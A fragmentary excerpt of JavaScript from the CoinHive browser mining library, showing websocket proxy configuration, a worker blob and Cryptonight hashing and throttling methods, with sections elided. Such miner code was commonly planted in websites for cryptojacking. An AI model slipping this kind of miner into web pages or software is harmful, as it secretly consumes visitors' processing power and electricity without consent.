...
self.CoinHive.CONFIG = {
  ...
  WEBSOCKET_URLS: ["wss://ws001.coin-hive.com/proxy", "wss://ws002.coin-hive.com/proxy"],
  CAPTCHA_URL: "https://coin-hive.com/captcha/"
};
CoinHive.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob([`
self.CoinHive = self.CoinHive || {};
self.CoinHive.CONFIG = {
    LIB_URL: "https://coin-hive.com/lib/",
    WEBSOCKET_URLS: ["wss://ws001.coin-hive.com/proxy", "wss://ws002.coin-hive.com/proxy"],
...
CryptonightWASMWrapper.prototype.onMessage = (function(msg) {
    if (!this.currentJob || this.currentJob.job_id !== msg.data.job_id) {
        this.setJob(msg.data)
    }
    if (msg.data.throttle) {
        this.throttleWait = 1 / (1 - msg.data.throttle) - 1;
...
CryptonightWASMWrapper.prototype.workThrottled = (function() {
    ...
    if (this.meetsTarget(this.output, this.target)) {
        ...
        setTimeout(this.workThrottledBound, timePerHash * this.throttleWait)
    }
});
